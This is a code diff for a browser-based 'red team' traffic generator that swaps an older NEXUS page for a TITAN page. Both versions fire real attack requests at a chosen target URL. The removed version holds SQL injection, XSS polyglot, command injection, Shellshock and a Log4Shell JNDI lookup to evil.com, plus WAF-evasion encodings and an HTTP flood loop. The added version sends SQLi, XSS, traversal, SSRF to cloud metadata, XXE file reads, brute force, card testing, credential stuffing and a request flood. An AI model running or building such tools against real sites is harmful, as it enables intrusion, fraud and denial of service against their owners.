@@ -3,350 +3,348 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS | Red Team Traffic Emulator</title>
+    <title>TITAN | Red Team WAF Traffic Generator</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* --- TITAN UI THEME --- */
         :root {
-            --bg: #050505; --panel: #0a0a0a; --border: #222;
-            --primary: #00ff9d; --accent: #00b8ff; --danger: #ff003c; --warn: #ffcc00;
-            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+            --bg: #050505; --sidebar: #0a0a0a; --border: #222;
+            --web-color: #00e1ff; --api-color: #ff0055; --bot-color: #ffaa00;
+            --text: #ccc; --font: 'Courier New', monospace;
         }
         * { box-sizing: border-box; user-select: none; }
-        body { background: var(--bg); color: #ccc; font-family: var(--font-mono); margin: 0; height: 100vh; overflow: hidden; display: grid; grid-template-columns: 300px 1fr; }
+        body { background: var(--bg); color: var(--text); font-family: var(--font); margin: 0; height: 100vh; display: flex; flex-direction: column; }
 
-        /* SIDEBAR */
-        .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 10px; }
-        .brand { font-size: 1.4rem; color: var(--primary); font-weight: 900; letter-spacing: 2px; margin-bottom: 20px; text-align: center; text-shadow: 0 0 10px rgba(0,255,157,0.3); }
-        
-        .control-group { margin-bottom: 20px; border: 1px solid var(--border); padding: 10px; border-radius: 4px; background: #000; }
-        .label { font-size: 0.7rem; color: #666; text-transform: uppercase; margin-bottom: 8px; display: block; font-weight: bold; }
-        
-        .btn { 
-            width: 100%; background: #111; border: 1px solid #333; color: var(--primary); 
-            padding: 12px; font-family: var(--font-mono); cursor: pointer; transition: 0.1s; 
-            text-align: left; font-size: 0.8rem; margin-bottom: 5px; display: flex; justify-content: space-between;
+        /* TOP BAR (TARGET INPUT) */
+        .top-bar { 
+            background: #000; border-bottom: 1px solid var(--border); padding: 15px 20px; 
+            display: flex; gap: 15px; align-items: center; z-index: 100; 
         }
-        .btn:hover { background: #1a1a1a; border-color: var(--primary); }
-        .btn:active { transform: translateY(2px); }
-        .btn-danger { color: var(--danger); border-color: #330000; }
-        .btn-danger:hover { background: #220000; border-color: var(--danger); }
+        .brand { font-size: 1.2rem; font-weight: 900; letter-spacing: 2px; color: #fff; margin-right: 20px; }
+        .brand span { color: var(--api-color); }
         
-        .slider-container { display: flex; align-items: center; gap: 10px; font-size: 0.8rem; }
-        input[type=range] { flex: 1; accent-color: var(--primary); }
+        .input-wrapper { flex: 1; display: flex; position: relative; }
+        .lbl { 
+            background: #1a1a1a; color: #fff; padding: 10px 15px; font-weight: bold; 
+            border: 1px solid #333; border-right: none; font-size: 0.8rem; display: flex; align-items: center;
+        }
+        #target-url { 
+            flex: 1; background: #111; border: 1px solid #333; color: #0f0; 
+            padding: 10px; font-family: var(--font); font-size: 1rem; outline: none; 
+        }
+        #target-url:focus { border-color: #fff; }
 
-        /* MAIN DASHBOARD */
-        .main { display: grid; grid-template-rows: 60px 1fr 200px; height: 100vh; }
+        /* MAIN LAYOUT */
+        .workspace { display: flex; flex: 1; overflow: hidden; }
         
-        /* Header Stats */
-        .header { border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); }
-        .stat-box { text-align: center; }
-        .stat-val { font-size: 1.2rem; font-weight: bold; color: #fff; display: block; }
-        .stat-lbl { font-size: 0.65rem; color: #666; text-transform: uppercase; }
-        .text-danger { color: var(--danger) !important; }
+        /* COLUMNS */
+        .col { flex: 1; display: flex; flex-direction: column; border-right: 1px solid var(--border); min-width: 300px; }
+        .col-head { 
+            padding: 12px; text-align: center; font-weight: bold; border-bottom: 2px solid transparent; 
+            text-transform: uppercase; letter-spacing: 1px; background: #0e0e0e; font-size: 0.9rem;
+        }
+        .head-web { border-bottom-color: var(--web-color); color: var(--web-color); }
+        .head-api { border-bottom-color: var(--api-color); color: var(--api-color); }
+        .head-bot { border-bottom-color: var(--bot-color); color: var(--bot-color); }
+
+        .col-body { flex: 1; overflow-y: auto; padding: 8px; background: #0c0c0c; }
+
+        /* ATTACK BUTTONS */
+        .btn {
+            width: 100%; background: #161616; color: #999; border: 1px solid #222;
+            padding: 10px 12px; margin-bottom: 5px; text-align: left; cursor: pointer;
+            transition: 0.1s; font-size: 0.75rem; display: flex; justify-content: space-between; align-items: center;
+        }
+        .btn:hover { background: #222; color: #fff; border-color: #444; }
+        .btn:active { transform: translateX(2px); }
+        .btn small { font-size: 0.65rem; color: #555; }
         
-        /* Live Terminal */
-        .terminal { background: #000; padding: 15px; overflow-y: auto; font-size: 0.75rem; display: flex; flex-direction: column-reverse; position: relative; }
-        .terminal::before { content: "LIVE TRAFFIC STREAM"; position: absolute; top: 10px; right: 20px; color: #222; font-weight: 900; font-size: 3rem; pointer-events: none; z-index: 0; }
-        .log { position: relative; z-index: 1; margin-bottom: 2px; border-bottom: 1px solid #0a0a0a; padding: 3px 0; display: grid; grid-template-columns: 60px 50px 50px 1fr; gap: 10px; animation: fadein 0.1s; }
-        .l-time { color: #444; }
+        .btn-web:hover { border-left: 3px solid var(--web-color); }
+        .btn-api:hover { border-left: 3px solid var(--api-color); }
+        .btn-bot:hover { border-left: 3px solid var(--bot-color); }
+
+        /* TERMINAL / LOGS */
+        .terminal { width: 35%; background: #000; border-left: 1px solid var(--border); display: flex; flex-direction: column; }
+        .term-head { padding: 10px; border-bottom: 1px solid var(--border); font-size: 0.8rem; font-weight: bold; display: flex; justify-content: space-between; color: #fff; }
+        .logs { flex: 1; overflow-y: auto; padding: 10px; font-size: 0.7rem; font-family: 'Courier New', monospace; display: flex; flex-direction: column-reverse; }
+        
+        .log-row { padding: 4px 0; border-bottom: 1px solid #111; display: grid; grid-template-columns: 60px 40px 50px 1fr; gap: 10px; }
+        .l-time { color: #555; }
         .l-method { font-weight: bold; }
         .l-status { font-weight: bold; }
-        .s-200 { color: var(--primary); } .s-403 { color: var(--danger); } .s-429 { color: var(--warn); } .s-0 { color: #444; }
-        .l-payload { color: #aaa; word-break: break-all; }
-        .tag { display: inline-block; padding: 0 4px; border-radius: 2px; font-size: 0.65rem; border: 1px solid #333; margin-right: 5px; }
+        .l-url { color: #888; word-break: break-all; }
+        .payload-preview { display: block; color: #444; margin-top: 2px; font-size: 0.65rem; }
 
-        /* Analytics Pane */
-        .analytics { border-top: 1px solid var(--border); background: var(--panel); padding: 15px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
-        .graph-box { border: 1px solid var(--border); background: #000; position: relative; }
-        .graph-bar { background: var(--danger); height: 100%; width: 0%; transition: width 0.2s; opacity: 0.2; }
-        
-        @keyframes fadein { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        .s-200 { color: #0f0; } .s-403 { color: #f00; } .s-0 { color: #fa0; }
+        .m-GET { color: #00e1ff; } .m-POST { color: #00ff9d; } .m-DEL { color: #ff0055; } .m-PUT { color: #ffaa00; }
 
-        /* Glitch Effect */
-        .glitch { animation: glitch 1s linear infinite; }
-        @keyframes glitch { 2%, 64% { transform: translate(2px,0) skew(0deg); } 4%, 60% { transform: translate(-2px,0) skew(0deg); } 62% { transform: translate(0,0) skew(5deg); } }
+        /* MOBILE */
+        @media (max-width: 1000px) { .workspace { flex-direction: column; overflow-y: auto; } .terminal { width: 100%; height: 250px; border-top: 1px solid var(--border); } }
     </style>
 </head>
 <body>
 
-<div class="sidebar">
-    <div class="brand">NEXUS <span style="font-size:0.5em; vertical-align:middle; color:#666;">v3.0</span></div>
-    
-    <div class="control-group">
-        <span class="label">Attack Vectors (WAF Stress)</span>
-        <button class="btn" onclick="engine.startBatch('SQLi')">
-            <span>SQL INJECTION</span> <i class="fa-solid fa-database"></i>
-        </button>
-        <button class="btn" onclick="engine.startBatch('XSS')">
-            <span>XSS POLYGLOT</span> <i class="fa-solid fa-code"></i>
-        </button>
-        <button class="btn" onclick="engine.startBatch('RCE')">
-            <span>RCE / SHELLSHOCK</span> <i class="fa-solid fa-terminal"></i>
-        </button>
-        <button class="btn" onclick="engine.startBatch('LFI')">
-            <span>PATH TRAVERSAL</span> <i class="fa-solid fa-folder-open"></i>
-        </button>
-    </div>
-
-    <div class="control-group">
-        <span class="label">Volumetric (Rate Limit)</span>
-        <div class="slider-container">
-            <span>Concurrency:</span>
-            <input type="range" id="concurrency" min="1" max="20" value="5" oninput="document.getElementById('c-val').innerText=this.value">
-            <span id="c-val" style="color:var(--primary)">5</span>
+    <div class="top-bar">
+        <div class="brand">TITAN<span>SEC</span></div>
+        <div class="input-wrapper">
+            <div class="lbl">TARGET URL</div>
+            <input type="text" id="target-url" value="https://thlab.online" placeholder="https://example.com">
         </div>
-        <button class="btn btn-danger" id="btn-flood" onclick="engine.toggleFlood()">
-            <span id="flood-txt">START HTTP FLOOD</span> <i class="fa-solid fa-bolt"></i>
-        </button>
-    </div>
-
-    <div class="control-group">
-        <span class="label">Evasion Techniques</span>
-        <div style="font-size:0.7rem; color:#888; margin-bottom:10px;">
-            <input type="checkbox" id="opt-poly" checked> Polymorphism (Case/Char)<br>
-            <input type="checkbox" id="opt-encode"> Double URL Encode<br>
-            <input type="checkbox" id="opt-null"> Null Byte Injection
-        </div>
-    </div>
-</div>
-
-<div class="main">
-    <div class="header">
-        <div class="stat-box">
-            <span class="stat-lbl">TARGET HOST</span>
-            <span class="stat-val" style="font-size:1rem; color:var(--accent)" id="target-host">...</span>
-        </div>
-        <div class="stat-box">
-            <span class="stat-lbl">TOTAL REQUESTS</span>
-            <span class="stat-val" id="stat-total">0</span>
-        </div>
-        <div class="stat-box">
-            <span class="stat-lbl">WAF BLOCKS (403)</span>
-            <span class="stat-val text-danger" id="stat-blocked">0</span>
-        </div>
-        <div class="stat-box">
-            <span class="stat-lbl">THROUGHPUT (RPS)</span>
-            <span class="stat-val" id="stat-rps">0</span>
+        <div style="font-size:0.7rem; color:#666; text-align:right;">
+            Status: <span id="status-text" style="color:#0f0">READY</span><br>
+            Sends REAL Traffic
         </div>
     </div>
 
-    <div class="terminal" id="terminal">
+    <div class="workspace">
+        
+        <div class="col">
+            <div class="col-head head-web"><i class="fa-solid fa-globe"></i> OWASP WEB TOP 10</div>
+            <div class="col-body">
+                <button class="btn btn-web" onclick="runAttack('A01')"><span>A01: Broken Access Control</span> <small>LFI / Traversal</small></button>
+                <button class="btn btn-web" onclick="runAttack('A02')"><span>A02: Cryptographic Fail</span> <small>Cleartext Submission</small></button>
+                <button class="btn btn-web" onclick="runAttack('A03')"><span>A03: Injection (SQLi)</span> <small>UNION SELECT</small></button>
+                <button class="btn btn-web" onclick="runAttack('A03X')"><span>A03: Injection (XSS)</span> <small>Script Tags</small></button>
+                <button class="btn btn-web" onclick="runAttack('A04')"><span>A04: Insecure Design</span> <small>Logic Bypass</small></button>
+                <button class="btn btn-web" onclick="runAttack('A05')"><span>A05: Misconfiguration</span> <small>Default Files</small></button>
+                <button class="btn btn-web" onclick="runAttack('A06')"><span>A06: Vuln. Components</span> <small>Old Libraries</small></button>
+                <button class="btn btn-web" onclick="runAttack('A07')"><span>A07: Auth Failures</span> <small>Brute Force</small></button>
+                <button class="btn btn-web" onclick="runAttack('A08')"><span>A08: Integrity Failures</span> <small>Deserialization</small></button>
+                <button class="btn btn-web" onclick="runAttack('A09')"><span>A09: Logging Failures</span> <small>Log Evasion</small></button>
+                <button class="btn btn-web" onclick="runAttack('A10')"><span>A10: SSRF</span> <small>Metadata Scan</small></button>
+            </div>
         </div>
 
-    <div class="analytics">
-        <div style="color:#666; font-size:0.7rem;">
-            <strong>STATUS:</strong> <span id="engine-status" style="color:var(--primary)">IDLE</span><br>
-            <strong>LAST VECTOR:</strong> <span id="last-vector">-</span><br>
-            <strong>LATENCY:</strong> <span id="last-latency">0ms</span>
+        <div class="col">
+            <div class="col-head head-api"><i class="fa-solid fa-network-wired"></i> API SECURITY (2025)</div>
+            <div class="col-body">
+                <button class="btn btn-api" onclick="runAttack('API1')"><span>API1: BOLA (IDOR)</span> <small>ID Enumeration</small></button>
+                <button class="btn btn-api" onclick="runAttack('API2')"><span>API2: Broken Auth</span> <small>No-Token Req</small></button>
+                <button class="btn btn-api" onclick="runAttack('API3')"><span>API3: Mass Assignment</span> <small>Admin Role</small></button>
+                <button class="btn btn-api" onclick="runAttack('API4')"><span>API4: Unrestricted Resource</span> <small>Rate Limit / DoS</small></button>
+                <button class="btn btn-api" onclick="runAttack('API5')"><span>API5: BFLA</span> <small>Unauth DELETE</small></button>
+                <button class="btn btn-api" onclick="runAttack('API6')"><span>API6: Sensitive Flows</span> <small>Scalping Bot</small></button>
+                <button class="btn btn-api" onclick="runAttack('API7')"><span>API7: SSRF (API)</span> <small>Webhook Attack</small></button>
+                <button class="btn btn-api" onclick="runAttack('API8')"><span>API8: Misconfiguration</span> <small>CORS / Verbose</small></button>
+                <button class="btn btn-api" onclick="runAttack('API9')"><span>API9: Inventory</span> <small>Zombie API v1</small></button>
+                <button class="btn btn-api" onclick="runAttack('API10')"><span>API10: Unsafe Cons.</span> <small>3rd Party Inj</small></button>
+            </div>
         </div>
-        <div class="graph-box" title="Block Rate">
-            <div id="bar-block-rate" class="graph-bar"></div>
-            <span style="position:absolute; top:5px; left:5px; font-size:0.6rem; color:#fff;">BLOCK RATE</span>
+
+        <div class="col">
+            <div class="col-head head-bot"><i class="fa-solid fa-robot"></i> AUTOMATED THREATS</div>
+            <div class="col-body">
+                <button class="btn btn-bot" onclick="runAttack('OAT1')"><span>OAT-001: Carding</span> <small>CC Check</small></button>
+                <button class="btn btn-bot" onclick="runAttack('OAT2')"><span>OAT-007: Cred Cracking</span> <small>Account Enum</small></button>
+                <button class="btn btn-bot" onclick="runAttack('OAT3')"><span>OAT-008: Cred Stuffing</span> <small>Pass Spraying</small></button>
+                <button class="btn btn-bot" onclick="runAttack('OAT4')"><span>OAT-011: Scraping</span> <small>High Velocity</small></button>
+                <button class="btn btn-bot" onclick="runAttack('OAT5')"><span>OAT-015: Denial of Service</span> <small>App Stress</small></button>
+                <button class="btn btn-bot" onclick="runAttack('OAT6')"><span>OAT-019: Acct Creation</span> <small>Fake Reg</small></button>
+                <button class="btn btn-bot" onclick="runAttack('OAT7')"><span>OAT-021: Denial of Inv.</span> <small>Cart Hoarding</small></button>
+            </div>
         </div>
-        <div style="color:#666; font-size:0.7rem;">
-            <i class="fa-solid fa-circle-info"></i> This tool generates <strong>real</strong> HTTP traffic using Fetch API.<br>
-            <i class="fa-solid fa-triangle-exclamation"></i> Requests originate from <strong>Client IP</strong>.
+
+        <div class="terminal">
+            <div class="term-head">
+                <span>TRAFFIC STREAM</span>
+                <div>SENT: <span id="cnt-sent" style="color:#fff">0</span> | BLOCKED: <span id="cnt-blk" style="color:#f00">0</span></div>
+            </div>
+            <div class="logs" id="console">
+                <div style="text-align:center; color:#444; margin-top:20px;">
+                    SYSTEM READY.<br>ENTER TARGET URL AND START ATTACK.
+                </div>
+            </div>
         </div>
+
     </div>
-</div>
 
 <script>
-/**
- * NEXUS ENGINE - Advanced Client-Side Traffic Generator
- * Capabilities: Concurrency, Polymorphism, Evasion, Real-time Metrics
- */
+    // GLOBAL COUNTERS
+    let stats = { sent: 0, blocked: 0 };
+    const rnd = () => Math.floor(Math.random() * 999999);
 
-const TARGET_BASE = window.location.origin + "/api"; // Hedef Endpoint (Netlify Functions veya Mock)
-document.getElementById('target-host').innerText = window.location.hostname;
+    /* --- MAIN ATTACK DISPATCHER --- */
+    async function runAttack(type) {
+        // 1. Get & Validate Target
+        let target = document.getElementById('target-url').value.replace(/\/$/, "");
+        if(!target.startsWith("http")) { alert("URL must start with http:// or https://"); return; }
 
-// --- 1. PAYLOAD DATABASE (WAF KILLERS) ---
-const PAYLOADS = {
-    'SQLi': [
-        "' OR '1'='1", 
-        "1 UNION SELECT null,@@version,null --", 
-        "admin' --", 
-        "1; DROP TABLE users", 
-        "' OR 1=1 /*", 
-        "1' OR '1'='1' -- "
-    ],
-    'XSS': [
-        "<script>alert(document.domain)</script>", 
-        "<img src=x onerror=alert(1)>", 
-        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
-        "<svg/onload=alert(1)>"
-    ],
-    'RCE': [
-        "; cat /etc/passwd", 
-        "| whoami", 
-        "() { :;}; /bin/bash -c 'sleep 5'", 
-        "${jndi:ldap://evil.com/x}"
-    ],
-    'LFI': [
-        "../../../../etc/passwd", 
-        "..%2F..%2F..%2Fwindows%2Fwin.ini", 
-        "/var/log/apache/access.log"
-    ]
-};
-
-// --- 2. ENGINE CORE ---
-const engine = {
-    stats: { total: 0, blocked: 0, startTime: 0 },
-    isFlooding: false,
-    rpsInterval: null,
-
-    // Yardımcı: Rastgele büyük/küçük harf (WAF Regex Bypass için)
-    polymorph: (str) => {
-        if(!document.getElementById('opt-poly').checked) return str;
-        return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
-    },
-
-    // Yardımcı: Evasion Encoding
-    encode: (str) => {
-        let res = str;
-        if(document.getElementById('opt-encode').checked) res = encodeURIComponent(encodeURIComponent(res));
-        if(document.getElementById('opt-null').checked) res = res + '%00';
-        return res;
-    },
-
-    // Tekil Saldırı İsteği
-    async sendReq(vector, payload) {
-        const finalPayload = this.encode(this.polymorph(payload));
-        const start = performance.now();
+        updateStatus(`EXECUTING: ${type}...`);
         
-        // Hedef URL'yi kirletme (Query Based Attack)
-        const url = `${TARGET_BASE}/${vector.toLowerCase()}?q=${finalPayload}&t=${Date.now()}`;
-        
-        this.stats.total++;
-        this.updateUI();
+        const requests = [];
+
+        // === OWASP WEB TOP 10 ===
+        if(type === 'A01') {
+            requests.push(send(target + '/admin/dashboard', 'GET'));
+            requests.push(send(target + '/users/1/delete', 'POST'));
+            requests.push(send(target + '/../../etc/passwd', 'GET'));
+        }
+        else if(type === 'A02') {
+            requests.push(send(target + '/api/pay', 'POST', {cc:'4111222233334444', cvv:'123', exp:'12/25'}));
+        }
+        else if(type === 'A03') { // SQLi
+            requests.push(send(target + `/products?id=' OR '1'='1`, 'GET'));
+            requests.push(send(target + `/login`, 'POST', {user:"admin' --", pass:"123"}));
+        }
+        else if(type === 'A03X') { // XSS
+            requests.push(send(target + `/search?q=<script>alert(1)</script>`, 'GET'));
+            requests.push(send(target + `/contact`, 'POST', {msg:"<img src=x onerror=alert(1)>"}));
+        }
+        else if(type === 'A04') { // Insecure Design
+            requests.push(send(target + '/shop/checkout', 'POST', {coupon:'DEV_100_OFF', price:0.00}));
+        }
+        else if(type === 'A05') { // Misconfig
+            requests.push(send(target + '/.git/config', 'GET'));
+            requests.push(send(target + '/actuator/env', 'GET'));
+        }
+        else if(type === 'A06') { // Vuln Comp
+            requests.push(send(target + '/assets/js/jquery-1.7.1.js', 'GET'));
+        }
+        else if(type === 'A07') { // Auth Fail (Brute)
+            for(let i=0; i<5; i++) requests.push(send(target + '/login', 'POST', {u:'admin', p:'pass'+i}));
+        }
+        else if(type === 'A08') { // Integrity
+            requests.push(send(target + '/api/update', 'POST', {data:'rO0ABXNyABFqYXZhLnV0aWwu...'}));
+        }
+        else if(type === 'A09') { // Logging
+            requests.push(send(target + '/api/logs?action=delete_all', 'DELETE'));
+        }
+        else if(type === 'A10') { // SSRF
+            requests.push(send(target + '/proxy?url=http://169.254.169.254/latest/meta-data', 'GET'));
+        }
+
+        // === OWASP API TOP 10 ===
+        else if(type === 'API1') { // BOLA
+            for(let i=1000; i<1005; i++) requests.push(send(target + `/api/v1/users/${i}`, 'GET'));
+        }
+        else if(type === 'API2') { // Broken Auth
+            requests.push(send(target + '/api/v1/admin', 'GET', null, {'Authorization':'None'}));
+        }
+        else if(type === 'API3') { // Mass Assignment
+            requests.push(send(target + '/api/v1/profile', 'POST', {user:'me', role:'ADMIN', is_root:true}));
+        }
+        else if(type === 'API4') { // Resource Cons.
+            for(let i=0; i<10; i++) requests.push(send(target + `/api/v1/search?q=test&t=${rnd()}`, 'GET'));
+        }
+        else if(type === 'API5') { // BFLA
+            requests.push(send(target + '/api/v1/users', 'DELETE'));
+        }
+        else if(type === 'API6') { // Sensitive Flow
+            for(let i=0; i<5; i++) requests.push(send(target + '/api/v1/buy', 'POST', {item_id:99, qty:100}));
+        }
+        else if(type === 'API7') { // API SSRF
+            requests.push(send(target + '/api/v1/hooks', 'POST', {callback: 'http://localhost:22'}));
+        }
+        else if(type === 'API8') { // Misconfig
+            requests.push(send(target + '/api/v1/info', 'GET', null, {'Origin':'http://evil.com'}));
+        }
+        else if(type === 'API9') { // Inventory
+            requests.push(send(target + '/api/v1/login', 'GET'));
+            requests.push(send(target + '/api/v0/login', 'GET'));
+        }
+        else if(type === 'API10') { // Unsafe Cons
+            requests.push(send(target + '/api/v1/parse', 'POST', {xml:'<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'}));
+        }
+
+        // === AUTOMATED THREATS (OAT) ===
+        else if(type === 'OAT1') { // Carding
+            for(let i=0; i<5; i++) requests.push(send(target + '/pay', 'POST', {cc: '411111111111'+rnd(), cvv:'123'}));
+        }
+        else if(type === 'OAT2') { // Enum
+            requests.push(send(target + '/forgot-password', 'POST', {email:'admin@company.com'}));
+            requests.push(send(target + '/forgot-password', 'POST', {email:'root@company.com'}));
+        }
+        else if(type === 'OAT3') { // Stuffing
+            requests.push(send(target + '/login', 'POST', {u:'leaked_user', p:'123456'}));
+        }
+        else if(type === 'OAT4') { // Scraping
+            for(let i=0; i<10; i++) requests.push(send(target + `/product/${i}`, 'GET', null, {'User-Agent':'ScraperBot/1.0'}));
+        }
+        else if(type === 'OAT5') { // DoS (Fire & Forget)
+            for(let i=0; i<30; i++) fetch(target + `/heavy-load?t=${rnd()}`, { mode: 'no-cors' });
+            addLog('GET', 'SENT', target + '/heavy-load (x30 Flood)');
+        }
+        else if(type === 'OAT6') { // Fake Account
+            for(let i=0; i<5; i++) requests.push(send(target + '/signup', 'POST', {email:`bot${rnd()}@spam.com`}));
+        }
+        else if(type === 'OAT7') { // Hoarding
+            for(let i=0; i<5; i++) requests.push(send(target + '/cart/add', 'POST', {id:101, qty:5}));
+        }
+
+        await Promise.all(requests);
+        updateStatus("READY");
+    }
+
+    /* --- NETWORK ENGINE --- */
+    async function send(url, method, body=null, headers={}) {
+        stats.sent++;
+        updateUI();
+
+        const opts = {
+            method: method,
+            headers: { 'Content-Type': 'application/json', ...headers },
+            mode: 'cors' // Crucial for WAF testing
+        };
+        if(body && method !== 'GET') opts.body = JSON.stringify(body);
 
         try {
-            const res = await fetch(url, { 
-                method: 'GET', // Bazı WAF'lar GET'te Query String'i daha sert tarar
-                cache: 'no-store',
-                headers: {
-                    'X-Forwarded-For': '127.0.0.1', // Header Poisoning
-                    'User-Agent': 'Nexus/3.0 Security Scanner'
-                }
-            });
+            const res = await fetch(url, opts);
             
-            const duration = Math.round(performance.now() - start);
-            const isBlocked = res.status === 403 || res.status === 406 || res.status === 500;
+            // Check for WAF Block Codes
+            if(res.status === 403 || res.status === 406 || res.status === 429) {
+                stats.blocked++;
+            }
+            addLog(method, res.status, url);
+            updateUI();
             
-            if(isBlocked) this.stats.blocked++;
-            
-            this.log(vector, res.status, finalPayload, duration);
-            document.getElementById('last-latency').innerText = duration + 'ms';
-
         } catch(e) {
-            // Network Error (WAF Connection Reset/Drop)
-            this.stats.blocked++;
-            this.log(vector, 0, finalPayload, 0);
+            // If browser blocks response (CORS) or WAF drops connection
+            // The request STILL left the browser, so it counts as traffic.
+            addLog(method, 0, url); 
         }
-    },
+    }
 
-    // Batch (Parti) Gönderici - Concurrency Ayarına Göre
-    async startBatch(vector) {
-        const payloads = PAYLOADS[vector];
-        if(!payloads) return;
-        
-        document.getElementById('engine-status').innerText = `ATTACKING: ${vector}`;
-        document.getElementById('last-vector').innerText = vector;
-
-        const concurrency = parseInt(document.getElementById('concurrency').value);
-        const promises = [];
-
-        // Her payload için Concurrency kadar istek oluştur
-        payloads.forEach(p => {
-            for(let i=0; i<concurrency; i++) {
-                promises.push(this.sendReq(vector, p));
-            }
-        });
-
-        await Promise.allSettled(promises);
-        document.getElementById('engine-status').innerText = "IDLE";
-    },
-
-    // Flood Loop
-    toggleFlood() {
-        const btn = document.getElementById('flood-txt');
-        if(this.isFlooding) {
-            this.isFlooding = false;
-            btn.innerText = "START HTTP FLOOD";
-            document.getElementById('engine-status').innerText = "IDLE";
-        } else {
-            this.isFlooding = true;
-            btn.innerText = "STOPPING..."; // Geçiş efekti
-            setTimeout(() => btn.innerText = "FLOOD ACTIVE", 200);
-            document.getElementById('engine-status').innerText = "FLOODING";
-            this.floodLoop();
-        }
-    },
-
-    async floodLoop() {
-        const concurrency = parseInt(document.getElementById('concurrency').value);
-        while(this.isFlooding) {
-            const batch = [];
-            for(let i=0; i<concurrency; i++) {
-                // Rastgele bir vektör ve payload seç
-                const vecKeys = Object.keys(PAYLOADS);
-                const vec = vecKeys[Math.floor(Math.random() * vecKeys.length)];
-                const p = PAYLOADS[vec][Math.floor(Math.random() * PAYLOADS[vec].length)];
-                batch.push(this.sendReq(vec, p));
-            }
-            await Promise.allSettled(batch);
-            await new Promise(r => setTimeout(r, 50)); // Browser'ın kilitlenmemesi için mikro mola
-        }
-    },
-
-    // UI Güncellemeleri
-    log(method, status, payload, ms) {
-        const term = document.getElementById('terminal');
+    /* --- UI HELPERS --- */
+    function addLog(method, status, url) {
+        const box = document.getElementById('console');
         const row = document.createElement('div');
-        row.className = 'log';
+        row.className = 'log-row';
         
         let sClass = 's-200';
-        if(status === 403) sClass = 's-403'; // Blocked
-        if(status === 429) sClass = 's-429'; // Rate Limit
-        if(status === 0) sClass = 's-0';     // Dropped
-
-        const displayPayload = payload.length > 40 ? payload.substring(0,40)+'...' : payload;
+        let sText = status;
         
+        if(status === 403 || status === 406) { sClass = 's-403'; sText = 'BLOCKED'; }
+        if(status === 0) { sClass = 's-0'; sText = 'SENT (Blind)'; } // CORS/NetErr
+
+        let mClass = 'm-GET';
+        if(method === 'POST') mClass = 'm-POST';
+        if(method === 'DELETE') mClass = 'm-DEL';
+
+        // Clean URL for display
+        const shortUrl = url.length > 40 ? '...' + url.substring(url.length - 40) : url;
+
         row.innerHTML = `
-            <span class="l-time">${new Date().toLocaleTimeString().split(' ')[0]}</span>
-            <span class="l-method">GET</span>
-            <span class="l-status ${sClass}">${status === 0 ? 'DROP' : status}</span>
-            <div class="l-payload">
-                <span class="tag">${method}</span>${displayPayload}
-            </div>
+            <span class="l-time">${new Date().toLocaleTimeString()}</span>
+            <span class="l-method ${mClass}">${method}</span>
+            <span class="l-status ${sClass}">${sText}</span>
+            <span class="l-url">${shortUrl}</span>
         `;
         
-        // Terminal 100 satırda kalsın
-        if(term.children.length > 100) term.lastElementChild.remove();
-        term.prepend(row);
-    },
-
-    updateUI() {
-        document.getElementById('stat-total').innerText = this.stats.total;
-        document.getElementById('stat-blocked').innerText = this.stats.blocked;
-        
-        // Block Rate Bar
-        const rate = this.stats.total > 0 ? (this.stats.blocked / this.stats.total) * 100 : 0;
-        document.getElementById('bar-block-rate').style.width = rate + '%';
+        // Keep log size manageable
+        if(box.children.length > 100) box.lastElementChild.remove();
+        box.prepend(row);
     }
-};
 
-// RPS Hesaplayıcı
-setInterval(() => {
-    if(engine.stats.startTime === 0) engine.stats.startTime = Date.now();
-    const diff = (Date.now() - engine.stats.startTime) / 1000;
-    if(diff > 1) {
-        const rps = Math.round(engine.stats.total / diff);
-        document.getElementById('stat-rps').innerText = rps;
-        // Reset per 10 sec to keep RPS current
-        if(diff > 10) { engine.stats.total = 0; engine.stats.blocked = 0; engine.stats.startTime = Date.now(); }
+    function updateUI() {
+        document.getElementById('cnt-sent').innerText = stats.sent;
+        document.getElementById('cnt-blk').innerText = stats.blocked;
     }
-}, 1000);
 
+    function updateStatus(msg) {
+        const el = document.getElementById('status-text');
+        el.innerText = msg;
+        el.style.color = msg === 'READY' ? '#0f0' : '#ffcc00';
+    }
 </script>
 </body>
 </html>
